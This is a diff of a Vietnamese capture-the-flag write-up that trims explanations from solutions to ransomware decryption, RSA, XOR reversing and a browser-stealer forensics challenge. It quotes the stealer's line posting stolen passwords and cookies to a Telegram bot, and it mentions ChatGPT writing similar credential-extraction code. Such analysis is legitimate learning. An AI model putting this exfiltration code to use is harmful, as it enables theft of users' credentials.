@@ -93,37 +93,9 @@ Kịch bản của đoạn script Powershell như sau:
 >
 1. Khai báo biến và kiểu dữ liệu
 Mục đích: Tạo các biến để tham chiếu đến các lớp cụ thể trong .NET nhằm hỗ trợ mã hóa, nén và xử lý dữ liệu.
-Các biến được định nghĩa:
-- gxqh: Đại diện cho chế độ mã hóa AES (CipherMode).
-- CipherPadding: Chỉ định chế độ đệm của AES (PaddingMode).
-- TextEncoding: Tham chiếu đến lớp mã hóa văn bản (System.Text.Encoding).
-- lc3Zj8: Quản lý chế độ nén (CompressionMode).
-- arZ3: Sử dụng để chuyển đổi dữ liệu (System.Convert).
-- ulZ2: Dùng để xử lý đường dẫn tệp (System.IO.Path).
-- 0Upe6: Đại diện cho người dùng hiện tại trên hệ thống Windows (WindowsPrincipal).
 
 2. Hàm mã hóa (Encrypt)
 Mục đích: Mã hóa nội dung của tệp và nén dữ liệu trước khi lưu.
-Chi tiết hoạt động:
-
-- Tạo đối tượng AES:
-Sử dụng AES với chế độ CBC (Cipher Block Chaining) và đệm kiểu Zeros.
-Kích thước khối: 128-bit; Kích thước khóa: 256-bit.
-
-- Thiết lập IV (Vector Khởi tạo) và Key:
-IV và Key được xác định trước trong dạng mảng byte. Điều này cho thấy khóa mã hóa cố định, làm giảm tính bảo mật nếu mã này được lặp lại trên nhiều máy.
-
-- Đọc nội dung tệp:
-Đọc tệp đầu vào dưới dạng byte và thực hiện mã hóa với TransformFinalBlock.
-
-- Chuyển đổi mã hóa sang Base64:
-Chuỗi mã hóa được chuyển sang dạng Base64 để dễ dàng lưu trữ và xử lý.
-
-- Nén dữ liệu:
-Dữ liệu Base64 được nén bằng DeflateStream.
-Ghi kết quả vào tệp đầu ra:
-Tệp kết quả được lưu với phần mở rộng .enc.
-
 Nhiệm vụ của mình giờ là **decrypt** -> **lấy lại tệp ảnh gốc** -> **flag** (**Decrypt** sẽ là làm ngược lại các thao tác khi **Encrypt**)
 
 Và đây là số lượng file đã bị **encrypt**
@@ -201,16 +173,6 @@ if __name__ == '__main__':
     decrypt(encrypted_file, decrypted_file)
     print(f"Decrypted data written to: {decrypted_file}")
 ```
-Đoạn scrypt trên sẽ thực hiện
->
-- Giải nén tệp nén (compressed file) bằng Zlib.
-
-- Chuyển đổi dữ liệu Base64 về dạng mảng byte.
-
-- Giải mã dữ liệu bằng AES để lấy nội dung tệp gốc.
-
-- Lưu dữ liệu đã giải mã thành tệp ảnh ban đầu.
-
 Mình sẽ thực hiện lần lượt với từng file bằng cách thêm file .enc vào hàm này
 
 ```
@@ -249,36 +211,7 @@ Sau chút ít thời gian ngồi mò, thì mình tìm thấy một file **tmp402
 
 ![image](https://github.com/user-attachments/assets/fc0fc53c-7b8a-41bb-ae2e-f9c2ca8e4473)
 
-Và đây là nhận định ban đầu về nội dung tệp 
->
-1. Script thực thi
-Tệp ghi lại toàn bộ mã PowerShell được thực thi, cụ thể:
-
-- Hàm XOR-String: Tạo khóa mã hóa (Key) và vector khởi tạo (IV) từ tên máy tính (PCName) bằng phép XOR với chuỗi tĩnh "UwU" và "XD
-
-- Hàm Encrypt-File: Dùng AES để mã hóa các tệp.
-
-- Lệnh Get-ChildItem và vòng lặp ForEach-Object: Tìm kiếm tất cả các tệp trong hệ thống và:
-
-- Mã hóa chúng với AES.
-
-- Ghi tệp đã mã hóa với phần mở rộng .cucked.
-
-- Xóa tệp gốc nếu tệp đã mã hóa thành công.
-
-2. Metadata từ log
-
-- Provider: Microsoft-Windows-PowerShell (cho biết mã PowerShell được thực thi).
-
-- EventID 4104: Xác định rằng đây là log ScriptBlock ghi lại nội dung mã lệnh PowerShell đã chạy.
-
-- ScriptBlockId: 86c0c4bd-646f-4363-918c-e9f50950fd92 là mã định danh duy nhất cho đoạn mã này.
-
-- TimeCreated: Ghi lại thời điểm script được thực thi: 2025-01-16T03:48:32.8070960Z.
-
-- UserID: S-1-5-21-3487867894-2063063461-3586319887-1001 đại diện cho người dùng đã chạy script, thuộc máy tính DESKTOP-SH94VUS.
-
-Ok giờ quay lại với vấn đề chính là đoạn script đã thực hiện mã hóa file gốc thành file .cucked và đã xóa file gốc đi
+Đoạn script đã thực hiện mã hóa file gốc thành file .cucked và đã xóa file gốc đi
 
 Thì như bài trước mình sẽ lại thực hiện ngược lại với quá trình mã hóa để tiến hành giải mã
 
@@ -351,46 +284,9 @@ if __name__ == "__main__":
                    print(f"Giải mã file {input_file} thất bại")
     print ("Hoàn tất giải mã")
 ```
-
-Chi tiết:
-
->
-
-1. Hàm xor_strings
-
-Mục đích: Thực hiện phép XOR giữa một chuỗi đầu vào (input_string) và một khóa (key) để tạo chuỗi kết quả.
-
-Cách hoạt động:
- - Chuyển chuỗi đầu vào và khóa thành mảng byte (input_bytes, key_bytes).
- - Duyệt từng byte trong chuỗi đầu vào và XOR với byte tương ứng trong khóa (lặp lại khóa nếu cần).
- - Kết quả là một mảng byte (output_bytes), sau đó được chuyển lại thành chuỗi (decode('utf-8')).
-
-2. Hàm decrypt_file
-Mục đích: Giải mã một tệp đã mã hóa với AES-CBC.
-
-CÁC BƯỚC:
-
-Đọc dữ liệu mã hóa từ tệp:
-
- - Mở tệp mã hóa (input_file) ở chế độ nhị phân ('rb').
- - Đọc toàn bộ dữ liệu mã hóa (encrypted_bytes).
-
-Giải mã AES:
- - Tạo đối tượng Cipher với thuật toán AES, chế độ CBC, khóa (key_bytes) và vector khởi tạo (iv_bytes).
- - Tạo decryptor từ cipher.decryptor().
- - Giải mã dữ liệu với decryptor.update() và decryptor.finalize().
-
-Bỏ padding (unpadding):
- - Do AES-CBC yêu cầu dữ liệu phải có độ dài bội số của kích thước khối (16 byte), padding đã được thêm vào khi mã hóa.
- - Dùng PKCS7 unpadder để loại bỏ padding và khôi phục dữ liệu gốc (unpadded_bytes).
-
-Ghi dữ liệu đã giải mã ra tệp:
- - Mở tệp đầu ra (output_file) và ghi dữ liệu đã giải mã (unpadded_bytes).
-
 Chạy mã và done
 
 ![image](https://github.com/user-attachments/assets/952f3f24-2e0f-47a3-ba50-42ce7e2b3d8c)
-
 
 Mở tệp **Voucher_hoc_bong_chuyen_auto_pass_mon.txt** là lấy được flag
 
@@ -493,22 +389,6 @@ flag = long_to_bytes(flag_long)
 
 print(flag)
 ```
-
-Chi tiết
-
->
-- Lấy dữ liệu: Nhận thông tin n, c, và các phương trình toán học.
-
-- Tìm p và q: Sử dụng sympy để giải hệ phương trình và tìm ra các số nguyên tố p và q.
-
-- Tính toán khóa riêng: Tính phi và d.
-
-- Giải mã: Giải mã ciphertext c bằng khóa riêng d.
-
-- Hiển thị flag: Chuyển kết quả về dạng bytes và in ra.
-
-Chạy mã và nhận được flag
-
 ![image](https://github.com/user-attachments/assets/4735bd16-dec7-4b07-95c2-8abc04985ac2)
 
 ```
@@ -523,11 +403,7 @@ Flag: KCSC{solv1ng_equ4ti0ns_with_r3sult4nts_is_f4n}
 
 Tải về nhận được 1 tệp .rar, giải nén có được file chal.exe
 
-Dùng Detect it easy để xem được viết bằng gì
-
-![image](https://github.com/user-attachments/assets/78359ac0-4a80-466b-86fc-0397dfa89cca)
-
-Ok được viết bằng C, mình cho vô IDA để decompile
+Mình cho vô IDA để decompile
 
 ![image](https://github.com/user-attachments/assets/1a413191-1483-4c73-b3d3-5685a890b90d)
 
@@ -541,23 +417,7 @@ Ok giờ thì đã dễ đọc hơn, mình nhìn cột bên trái thì thấy c�
 
 ![image](https://github.com/user-attachments/assets/4eb26d0f-68a0-4e95-9a9d-9aeb5da9766b)
 
-Đoạn mã trên là một hàm C có chức năng in ra một chuỗi ký tự đã được mã hóa. Chuỗi này sẽ được giải mã bằng một phép XOR với giá trị cố định 0x88 cụ thể:
-
->
-- v2[3]:Là một mảng chứa 3 phần tử kiểu _QWORD (tức là số nguyên 64-bit không dấu).
-
-- Dữ liệu trong mảng này được khởi tạo với các giá trị:
-
-v2[0] = 0xFDE7F1F3CBDBCBC3;
-v2[1] = 0xFBD7FCAFE6E9EBD7;
-v2[2] = 0xF5FEB2EDE5D7EDED;
-
-=> Đây là các giá trị mã hóa của chuỗi ký tự.
-
-- result: Là biến được sử dụng để lưu trạng thái trả về từ printf().
-
-- Vòng lặp for (i = 0; i <= 23; ++i):
-- Vòng lặp chạy 24 lần, tương ứng với số ký tự trong chuỗi cần giải mã (24 ký tự).
+Đoạn mã trên là một hàm C có chức năng in ra một chuỗi ký tự đã được mã hóa. Chuỗi này sẽ được giải mã bằng một phép XOR với giá trị cố định 0x88
 
 Và đây là script giải mã
 
@@ -688,11 +548,6 @@ Thử thách cho mình 1 tệp .zip giải nén ta có được 1 tệp .rar và
 
 ![image](https://github.com/user-attachments/assets/a92574d1-b992-41e4-8634-4c56b85182f5)
 
->
-- File .cmd là một tệp lệnh (batch file) trong hệ điều hành Windows. Tệp này chứa một chuỗi các lệnh mà hệ thống có thể thực thi trong Command Prompt (CMD). 
-- Các lệnh này có thể bao gồm thao tác trên hệ thống, chạy các chương trình, và thực hiện các tác vụ tự động. 
-- Tệp .cmd thường được sử dụng để tự động hóa các tác vụ, ví dụ như cài đặt phần mềm, sao lưu dữ liệu, hoặc cấu hình hệ thống.
-
 
 Vì đây là lần đầu mình làm việc với file này nên mình cứ thử dùng hết các tool trích xuất chuỗi văn bản như strings hoặc cat
 
@@ -700,18 +555,11 @@ Và đây là lệnh cat
 
 ![image](https://github.com/user-attachments/assets/c549aab3-0e12-4140-adee-6a4201459ae4)
 
-Có thể thấy 1 đoạn chuỗi kí tự vừa dài, vừa loằng ngoằng rất khó hiểu
-
-Nhưng lướt xuống cuối thì mình thấy
+Lướt xuống cuối thì mình thấy
 
 ![image](https://github.com/user-attachments/assets/9072780e-7707-4d7c-bd3f-54c19744149c)
 
 Giữa những kí tự khó hiểu đó là một số đường dẫn và đây là nhận định của mình
-
->
-- Dường như đây là một đoạn mã hoặc chuỗi lệnh trong một tệp .cmd, có vẻ liên quan đến việc tải về và giải nén một tệp từ một nguồn URL nhất định ở đây là raw.githubusercontent.com
-
-- Sau đó thực thi một tệp PowerShell (powershell.exe) để thực hiện các thao tác tải tệp và giải nén. Một số phần của chuỗi cũng đề cập đến việc chạy một tệp thực thi python .exe
 
 Mình nhìn thấy một link github có một tệp snake.zip mình liền tải về
 
@@ -876,32 +724,9 @@ if __name__ == '__main__':
                 requests.post(api, data={'caption': "------Exfiltrated Data------ \n Browser: " + browser + "\n Type: " + data_type_name,'chat_id': id}, files={'document': exfildat})
 ```
 
-Cụ thể:
+- Sau khi trích xuất dữ liệu lịch sử người dùng trên Edge, tệp dữ liệu sẽ được gửi đến một bot Telegram thông qua API của Telegram.
 
->
-1 Trích xuất dữ liệu người dùng:
-
-- Mã định nghĩa một số loại dữ liệu cần trích xuất từ các trình duyệt: mật khẩu (login data), thông tin thẻ tín dụng (credits card), cookie, lịch sử duyệt web (history), và tệp tải về (downloads).
-- Các truy vấn SQL tương ứng được định nghĩa để lấy dữ liệu từ các tệp SQLite (các tệp cơ sở dữ liệu của trình duyệt) và các cột dữ liệu như URL, tên người dùng, mật khẩu, v.v.
-
-2 Lấy và giải mã khóa chính (Master Key):
-- Hàm get_master_key tìm kiếm khóa chính (encrypted key) từ tệp "Local State" của trình duyệt. Nếu tệp này chứa khóa mã hóa,
-- Nếu tệp này chứa khóa mã hóa, Nó sẽ giải mã khóa bằng cách sử dụng phương pháp CryptUnprotectData của Windows và trả về khóa giải mã.
-
-3 Giải mã mật khẩu:
-Hàm decrypt_password nhận dữ liệu đã mã hóa và sử dụng AES GCM để giải mã dữ liệu đó. Dữ liệu mật khẩu sẽ được giải mã và trả về dưới dạng chuỗi.
-
-4 Trích xuất dữ liệu từ cơ sở dữ liệu của trình duyệt:
-- Các hàm như get_data thực hiện sao chép các cơ sở dữ liệu của trình duyệt vào một tệp tạm thời, sau đó kết nối với cơ sở dữ liệu SQLite và thực hiện các truy vấn SQL để lấy dữ liệu.
-- Nếu dữ liệu được mã hóa (như mật khẩu), nó sẽ được giải mã. Lịch sử duyệt web được chuyển đổi từ định dạng thời gian Chrome (microseconds từ năm 1601) sang định dạng ngày giờ dễ đọc.
-
-5 Lưu kết quả:
-- Dữ liệu trích xuất được lưu vào các tệp văn bản trên hệ thống (ví dụ: C:/Users/Public/Snake/{browser}/{data_type_name}.txt).
-- Gửi dữ liệu tới Telegram:
-
-Sau khi trích xuất dữ liệu, tệp dữ liệu sẽ được gửi đến một bot Telegram thông qua API của Telegram.
-Bot sẽ gửi các tệp dữ liệu (như mật khẩu, cookie) kèm theo thông tin về trình duyệt và loại dữ liệu đã bị trích xuất.
-
+- Bot sẽ gửi các tệp dữ liệu (như mật khẩu, cookie) kèm theo thông tin về trình duyệt và loại dữ liệu đã bị trích xuất.
 
 Mình nhờ chatgpt viết 1 đoạn python để trích xuất từ trình duyệt các thông tin như (login data), (credits card), (history), (downloads) và gửi chúng đến **bot** -> nhận được phản hồi
 
@@ -1065,8 +890,6 @@ Khi đc các anh báo lại thì mình vô phần profile của tài khoản mì
 **Và đây là máy ảo**
 
 ![image](https://github.com/user-attachments/assets/2702b0b9-8c46-48ba-93eb-b1306eb39711)
-
-Quay trở lại vấn đề chính, là mình đã trích xuất được ra những file .txt ở kia nhưng vẫn kh biết làm cách nào để nhận được flag :(
 
 Mình đã thử rất nhiều cách và phải cho đến khi hết giải mình mới tìm ra solution [tại đây](https://github.com/soxoj/telegram-bot-dumper)
 
